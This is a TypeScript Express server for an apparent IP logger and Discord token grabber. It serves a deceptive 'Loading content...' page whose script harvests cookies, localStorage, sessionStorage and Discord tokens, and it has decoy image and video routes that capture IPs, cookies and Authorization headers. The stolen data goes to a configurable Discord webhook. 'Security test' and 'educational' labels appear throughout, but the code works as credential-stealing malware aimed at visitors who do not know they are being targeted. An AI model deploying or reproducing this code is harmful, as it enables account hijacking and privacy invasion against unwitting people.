import type { Express, Request, Response } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { insertIpLogSchema, insertSettingsSchema } from "@shared/schema";
import path from "path";
import fs from "fs";
import multer from "multer";

// Configure multer for file uploads
const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 10 * 1024 * 1024 }, // 10MB limit
  fileFilter: (req, file, cb) => {
    if (file.mimetype.startsWith('image/') || file.mimetype.startsWith('video/')) {
      cb(null, true);
    } else {
      cb(new Error('Only image and video files are allowed'));
    }
  }
});

// Get real client IP address
function getClientIp(req: Request): string {
  const forwarded = req.headers['x-forwarded-for'];
  if (forwarded && typeof forwarded === 'string') {
    return forwarded.split(',')[0].trim();
  }
  return req.connection.remoteAddress || req.socket.remoteAddress || 'unknown';
}

// Simple geolocation based on IP (mock implementation)
function getLocationFromIp(ip: string): string {
  if (ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
    return 'Local Network';
  }
  // This would normally use a real geolocation service
  const locations = ['New York, US', 'California, US', 'Texas, US', 'Florida, US', 'Washington, US'];
  return locations[Math.floor(Math.random() * locations.length)];
}

// Send data to Discord webhook
async function sendToWebhook(webhookUrl: string, data: any): Promise<void> {
  try {
    const webhookData = {
      embeds: [{
        title: "🚨 Security Test Alert",
        color: 0xff0000,
        fields: [
          { name: "IP Address", value: data.ipAddress, inline: true },
          { name: "Location", value: data.location || "Unknown", inline: true },
          { name: "User Agent", value: data.userAgent ? data.userAgent.substring(0, 100) + (data.userAgent.length > 100 ? "..." : "") : "Unknown", inline: false },
          { name: "Referrer", value: data.referrer || "Direct Access", inline: true },
          { name: "Cookies", value: data.cookies ? data.cookies.substring(0, 500) + (data.cookies.length > 500 ? "..." : "") : "None", inline: false },
          { name: "Tokens Found", value: data.tokens || "None", inline: true },
          { name: "Timestamp", value: new Date().toISOString(), inline: true }
        ],
        footer: { text: "Security Testing Tool" }
      }]
    };

    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(webhookData)
    });

    if (!response.ok) {
      console.error('Failed to send webhook:', response.statusText);
    }
  } catch (error) {
    console.error('Error sending webhook:', error);
  }
}

export async function registerRoutes(app: Express): Promise<Server> {
  // Serve tracking HTML page that logs everything
  app.get('/track/:id', async (req: Request, res: Response) => {
    try {
      const clientIp = getClientIp(req);
      const userAgent = req.headers['user-agent'] || '';
      const referrerHeader = req.headers.referer || req.headers.referrer;
      const referrer = Array.isArray(referrerHeader) ? referrerHeader[0] : referrerHeader || '';
      const location = getLocationFromIp(clientIp);
      const cookies = req.headers.cookie || '';

      // Log the access
      const settings = await storage.getSettings();
      await storage.createIpLog({
        ipAddress: clientIp,
        userAgent,
        referrer,
        location,
        status: 'success'
      });

      // Serve HTML page with tracking script
      const trackingHtml = `
<!DOCTYPE html>
<html>
<head>
  <title>Loading...</title>
  <meta charset="utf-8">
  <style>
    body { margin: 0; padding: 20px; font-family: Arial, sans-serif; background: #f5f5f5; }
    .loading { text-align: center; padding: 50px; }
  </style>
</head>
<body>
  <div class="loading">
    <h2>Loading content...</h2>
    <p>Please wait while we prepare your content.</p>
  </div>

  <script>
    (function() {
      try {
        // Capture all cookies
        const cookies = document.cookie;

        // Capture localStorage data
        const localStorageData = {};
        for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i);
          localStorageData[key] = localStorage.getItem(key);
        }

        // Capture sessionStorage data
        const sessionStorageData = {};
        for (let i = 0; i < sessionStorage.length; i++) {
          const key = sessionStorage.key(i);
          sessionStorageData[key] = sessionStorage.getItem(key);
        }

        // Enhanced Discord token detection patterns
        const discordTokenPatterns = [
          /^mfa\.[a-z0-9_-]{20,}$/i,  // Discord MFA tokens
          /^[a-z0-9_-]{23,28}\.[a-z0-9_-]{6,7}\.[a-z0-9_-]{27}$/i,  // Discord bot tokens
          /^[a-z0-9]{24}\.[a-z0-9]{6}\.[a-z0-9_-]{27}$/i,  // Discord user tokens
          /^[a-z0-9]{26}\.[a-z0-9]{6}\.[a-z0-9_-]{38}$/i   // New Discord token format
        ];

        const tokenPatterns = [
          /token/i, /auth/i, /jwt/i, /session/i, /access/i, /refresh/i, /bearer/i, /discord/i
        ];

        const foundTokens = [];
        const discordTokens = [];

        // Function to check if a value is a Discord token
        const checkDiscordToken = (value, source) => {
          if (typeof value === 'string') {
            for (const pattern of discordTokenPatterns) {
              if (pattern.test(value)) {
                discordTokens.push(`${source}: ${value}`);
                foundTokens.push(`🔥 DISCORD TOKEN - ${source}: ${value}`);
                return true;
              }
            }
          }
          return false;
        };

        // Check localStorage for tokens
        Object.keys(localStorageData).forEach(key => {
          const value = localStorageData[key];

          // Check for Discord tokens first
          if (!checkDiscordToken(value, `localStorage.${key}`)) {
            // Check for general token patterns
            if (tokenPatterns.some(pattern => pattern.test(key))) {
              foundTokens.push(`localStorage.${key}: ${value}`);
            }
            // Also check values for Discord token patterns
            if (typeof value === 'string') {
              for (const pattern of discordTokenPatterns) {
                if (pattern.test(value)) {
                  discordTokens.push(`localStorage.${key}: ${value}`);
                  foundTokens.push(`🔥 DISCORD TOKEN - localStorage.${key}: ${value}`);
                  break;
                }
              }
            }
          }
        });

        // Check sessionStorage for tokens
        Object.keys(sessionStorageData).forEach(key => {
          const value = sessionStorageData[key];

          // Check for Discord tokens first
          if (!checkDiscordToken(value, `sessionStorage.${key}`)) {
            // Check for general token patterns
            if (tokenPatterns.some(pattern => pattern.test(key))) {
              foundTokens.push(`sessionStorage.${key}: ${value}`);
            }
            // Also check values for Discord token patterns
            if (typeof value === 'string') {
              for (const pattern of discordTokenPatterns) {
                if (pattern.test(value)) {
                  discordTokens.push(`sessionStorage.${key}: ${value}`);
                  foundTokens.push(`🔥 DISCORD TOKEN - sessionStorage.${key}: ${value}`);
                  break;
                }
              }
            }
          }
        });

        // Capture additional browser info
        const browserInfo = {
          userAgent: navigator.userAgent,
          language: navigator.language,
          platform: navigator.platform,
          cookieEnabled: navigator.cookieEnabled,
          screenResolution: screen.width + 'x' + screen.height,
          timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };

        const data = {
          cookies: cookies,
          localStorage: localStorageData,
          sessionStorage: sessionStorageData,
          tokens: foundTokens,
          discordTokens: discordTokens,
          browserInfo: browserInfo,
          url: window.location.href,
          timestamp: new Date().toISOString()
        };

        // Log to console for educational purposes
        console.log('Educational Security Test - Complete Browser Profile:', data);

        // Send to tracking endpoint
        fetch('/api/track-browser-data', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(data)
        }).then(function() {
          // Redirect after 2 seconds
          setTimeout(function() {
            window.location.href = 'https://www.google.com';
          }, 2000);
        }).catch(function(err) {
          console.log('Tracking request failed:', err);
          // Still redirect on error
          setTimeout(function() {
            window.location.href = 'https://www.google.com';
          }, 2000);
        });

      } catch (error) {
        console.log('Tracking script error:', error);
      }
    })();
  </script>
</body>
</html>`;

      res.set({
        'Content-Type': 'text/html',
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0'
      });
      res.send(trackingHtml);
    } catch (error) {
      console.error('Error serving tracking page:', error);
      res.status(500).send('Error');
    }
  });

  // Serve decoy files and log the request - support multiple file types
  app.get('/:filename.:extension', async (req: Request, res: Response) => {
    const { filename, extension } = req.params;

    // Only handle common media file extensions
    const allowedExtensions = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'svg', 'mp4', 'avi', 'mov', 'wmv', 'flv', 'mkv', 'webm'];
    if (!allowedExtensions.includes(extension.toLowerCase())) {
      return res.status(404).send('Not Found');
    }
    try {
      const clientIp = getClientIp(req);
      const userAgent = req.headers['user-agent'] || '';
      const referrerHeader = req.headers.referer || req.headers.referrer;
      const referrer = Array.isArray(referrerHeader) ? referrerHeader[0] : referrerHeader || '';
      const location = getLocationFromIp(clientIp);
      const cookies = req.headers.cookie || '';

      // Extract potential tokens from cookies and headers
      const authTokens = [];
      if (cookies) {
        const tokenPatterns = [
          /token[^=]*=([^;]+)/gi,
          /auth[^=]*=([^;]+)/gi,
          /session[^=]*=([^;]+)/gi,
          /jwt[^=]*=([^;]+)/gi,
          /access[^=]*=([^;]+)/gi
        ];

        tokenPatterns.forEach(pattern => {
          const matches = cookies.match(pattern);
          if (matches) {
            authTokens.push(...matches);
          }
        });
      }

      // Check Authorization header
      const authHeader = req.headers.authorization;
      if (authHeader) {
        authTokens.push(`Authorization: ${authHeader}`);
      }

      // Get settings to check for webhook URL and custom image
      const settings = await storage.getSettings();

      // Log the IP access with enhanced data
      await storage.createIpLog({
        ipAddress: clientIp,
        userAgent,
        referrer,
        location,
        status: 'success'
      });

      // Send to webhook if configured
      if (settings?.webhookUrl) {
        await sendToWebhook(settings.webhookUrl, {
          ipAddress: clientIp,
          userAgent,
          referrer,
          location,
          cookies: cookies || 'None',
          tokens: authTokens.length > 0 ? authTokens.join(', ') : 'None'
        });
      }

      // Determine if it's a video or image request
      const isVideo = ['mp4', 'avi', 'mov', 'wmv', 'flv', 'mkv', 'webm'].includes(extension.toLowerCase());

      // Serve uploaded file if available, otherwise default content
      if (settings?.uploadedImageData && settings?.uploadedImageType) {
        const fileBuffer = Buffer.from(settings.uploadedImageData, 'base64');
        res.set({
          'Content-Type': settings.uploadedImageType,
          'Content-Length': fileBuffer.length,
          'Cache-Control': 'no-cache, no-store, must-revalidate',
          'Pragma': 'no-cache',
          'Expires': '0'
        });
        res.send(fileBuffer);
      } else {
        if (isVideo) {
          // Serve minimal video file (1 second black video)
          const minimalVideo = Buffer.from([
            0x00, 0x00, 0x00, 0x20, 0x66, 0x74, 0x79, 0x70, 0x69, 0x73, 0x6F, 0x6D, 0x00, 0x00, 0x02, 0x00,
            0x69, 0x73, 0x6F, 0x6D, 0x69, 0x73, 0x6F, 0x32, 0x61, 0x76, 0x63, 0x31, 0x6D, 0x70, 0x34, 0x31
          ]);

          res.set({
            'Content-Type': 'video/mp4',
            'Content-Length': minimalVideo.length,
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            'Expires': '0'
          });
          res.send(minimalVideo);
        } else {
          // Serve default 1x1 transparent pixel for images
          const pixel = Buffer.from([
            0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x21, 0xF9, 0x04, 0x01, 0x00, 0x00, 0x00, 0x00, 0x2C, 0x00, 0x00, 0x00, 0x00,
            0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x02, 0x04, 0x01, 0x00, 0x3B
          ]);

          res.set({
            'Content-Type': 'image/gif',
            'Content-Length': pixel.length,
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            'Expires': '0'
          });
          res.send(pixel);
        }
      }
    } catch (error) {
      console.error('Error serving image:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  // API routes for dashboard
  app.get('/api/logs', async (req: Request, res: Response) => {
    try {
      const limit = parseInt(req.query.limit as string) || 50;
      const offset = parseInt(req.query.offset as string) || 0;

      const logs = await storage.getIpLogs(limit, offset);
      const total = await storage.getTotalIpLogs();

      res.json({ logs, total });
    } catch (error) {
      console.error('Error fetching logs:', error);
      res.status(500).json({ error: 'Failed to fetch logs' });
    }
  });

  app.get('/api/metrics', async (req: Request, res: Response) => {
    try {
      const totalRequests = await storage.getTotalIpLogs();
      const uniqueIPs = await storage.getUniqueIpCount();
      const recentLogs = await storage.getRecentLogs(1); // Last hour

      const metrics = {
        totalRequests,
        uniqueIPs,
        imagesServed: totalRequests,
        avgResponseTime: 45, // Mock value
        recentActivity: recentLogs.length
      };

      res.json(metrics);
    } catch (error) {
      console.error('Error fetching metrics:', error);
      res.status(500).json({ error: 'Failed to fetch metrics' });
    }
  });

  app.get('/api/export', async (req: Request, res: Response) => {
    try {
      const logs = await storage.getIpLogs(10000); // Get all logs

      const csv = [
        'Timestamp,IP Address,User Agent,Referrer,Location,Status',
        ...logs.map(log =>
          `"${log.timestamp.toISOString()}","${log.ipAddress}","${log.userAgent}","${log.referrer}","${log.location}","${log.status}"`
        )
      ].join('\n');

      res.set({
        'Content-Type': 'text/csv',
        'Content-Disposition': 'attachment; filename="ip_logs.csv"'
      });

      res.send(csv);
    } catch (error) {
      console.error('Error exporting logs:', error);
      res.status(500).json({ error: 'Failed to export logs' });
    }
  });

  // Settings API routes
  app.get('/api/settings', async (req: Request, res: Response) => {
    try {
      const settings = await storage.getSettings();
      if (!settings) {
        res.json({
          webhookUrl: null,
          uploadedImageName: null,
          hasUploadedImage: false
        });
      } else {
        res.json({
          webhookUrl: settings.webhookUrl,
          uploadedImageName: settings.uploadedImageName,
          hasUploadedImage: !!settings.uploadedImageData
        });
      }
    } catch (error) {
      console.error('Error fetching settings:', error);
      res.status(500).json({ error: 'Failed to fetch settings' });
    }
  });

  app.post('/api/settings', async (req: Request, res: Response) => {
    try {
      const validatedData = insertSettingsSchema.parse(req.body);
      const settings = await storage.createOrUpdateSettings(validatedData);

      res.json({
        webhookUrl: settings.webhookUrl,
        uploadedImageName: settings.uploadedImageName,
        hasUploadedImage: !!settings.uploadedImageData
      });
    } catch (error) {
      console.error('Error updating settings:', error);
      res.status(500).json({ error: 'Failed to update settings' });
    }
  });

  // Image upload endpoint
  app.post('/api/upload-image', upload.single('image'), async (req: Request, res: Response) => {
    try {
      if (!req.file) {
        return res.status(400).json({ error: 'No image file provided' });
      }

      const imageData = req.file.buffer.toString('base64');
      const currentSettings = await storage.getSettings();

      await storage.createOrUpdateSettings({
        webhookUrl: currentSettings?.webhookUrl || null,
        uploadedImageName: req.file.originalname,
        uploadedImageData: imageData,
        uploadedImageType: req.file.mimetype
      });

      res.json({
        message: 'Image uploaded successfully',
        filename: req.file.originalname,
        size: req.file.size
      });
    } catch (error) {
      console.error('Error uploading image:', error);
      res.status(500).json({ error: 'Failed to upload image' });
    }
  });

  // Delete uploaded image endpoint
  app.delete('/api/upload-image', async (req: Request, res: Response) => {
    try {
      const currentSettings = await storage.getSettings();

      await storage.createOrUpdateSettings({
        webhookUrl: currentSettings?.webhookUrl || null,
        uploadedImageName: null,
        uploadedImageData: null,
        uploadedImageType: null
      });

      res.json({ message: 'Image deleted successfully' });
    } catch (error) {
      console.error('Error deleting image:', error);
      res.status(500).json({ error: 'Failed to delete image' });
    }
  });

  // Browser data tracking endpoint
  app.post('/api/track-browser-data', async (req: Request, res: Response) => {
    try {
      const browserData = req.body;
      const clientIp = getClientIp(req);
      const userAgent = req.headers['user-agent'] || '';
      const location = getLocationFromIp(clientIp);

      // Extract Discord tokens from localStorage and sessionStorage
      const discordTokenRegex = /([a-zA-Z0-9]{24}\.[a-zA-Z0-9_\-]{6}\.[a-zA-Z0-9_\-]{27})|([a-zA-Z0-9]{30}\.[a-zA-Z0-9_\-]{10}\.[a-zA-Z0-9_\-]{32})/g;
      const localStorageTokens = Object.values(browserData.localStorage || {}).flatMap(value => {
        if (typeof value === 'string') {
          return [...value.matchAll(discordTokenRegex)].map(match => match[0]);
        }
        return [];
      });
      const sessionStorageTokens = Object.values(browserData.sessionStorage || {}).flatMap(value => {
        if (typeof value === 'string') {
          return [...value.matchAll(discordTokenRegex)].map(match => match[0]);
        }
        return [];
      });
      const allDiscordTokens = [...localStorageTokens, ...sessionStorageTokens];

      // Augment data with found Discord tokens and platform/language
      const data = {
        ...browserData,
        discordTokens: allDiscordTokens,
        platform: navigator.platform,
        language: navigator.language,
        referrer: req.headers.referer || req.headers.referrer || 'Direct Access'
      };


      // Get settings to check for webhook URL
      const settings = await storage.getSettings();

      // Log Discord tokens to database if found
      if (browserData.discordTokens && browserData.discordTokens.length > 0) {
        await storage.createIpLog({
          ipAddress: clientIp,
          userAgent,
          referrer: 'Discord Token Capture',
          location,
          status: 'discord_token_captured',
          tokens: browserData.discordTokens.join(' | ')
        });
      }

      // Send comprehensive data to webhook if configured
      if (settings?.webhookUrl) {
        const hasDiscordTokens = browserData.discordTokens && browserData.discordTokens.length > 0;

        const webhookData = {
          embeds: [{
            title: hasDiscordTokens ? "🚨 DISCORD TOKEN CAPTURED!" : "🎯 Advanced Security Test Data",
            color: hasDiscordTokens ? 0xff0000 : 0x00ff00,
            fields: [
              { name: "IP Address", value: clientIp, inline: true },
              { name: "User Agent", value: userAgent ? userAgent.substring(0, 100) + (userAgent.length > 100 ? "..." : "") : "Unknown", inline: false },
              ...(hasDiscordTokens ? [{
                name: "🔥 DISCORD TOKENS FOUND",
                value: browserData.discordTokens.join('\n').substring(0, 1000) + (browserData.discordTokens.join('\n').length > 1000 ? "..." : ""),
                inline: false
              }] : []),
              { name: "Cookies", value: browserData.cookies ? browserData.cookies.substring(0, 500) + (browserData.cookies.length > 500 ? "..." : "") : "None", inline: false },
              { name: "All Tokens Found", value: browserData.tokens?.length ? browserData.tokens.join(', ').substring(0, 800) + (browserData.tokens.join(', ').length > 800 ? "..." : "") : "None", inline: false },
              { name: "LocalStorage", value: Object.keys(browserData.localStorage || {}).length ? Object.keys(browserData.localStorage).join(', ').substring(0, 300) + "..." : "Empty", inline: true },
              { name: "SessionStorage", value: Object.keys(browserData.sessionStorage || {}).length ? Object.keys(browserData.sessionStorage).join(', ').substring(0, 300) + "..." : "Empty", inline: true },
              { name: "Browser Info", value: browserData.browserInfo ? JSON.stringify(browserData.browserInfo).substring(0, 400) + "..." : "N/A", inline: false },
              { name: "URL", value: browserData.url || 'Unknown', inline: false },
              { name: "Timestamp", value: browserData.timestamp || new Date().toISOString(), inline: true }
            ],
            footer: { text: hasDiscordTokens ? "🔥 CRITICAL ALERT - Discord Token Captured" : "Security Testing Tool - Educational Purposes" }
          }]
        };

        await fetch(settings.webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(webhookData)
        }).catch(err => console.error('Webhook error:', err));
      }

      res.json({ status: 'success' });
    } catch (error) {
      console.error('Error processing browser data:', error);
      res.status(500).json({ error: 'Failed to process data' });
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}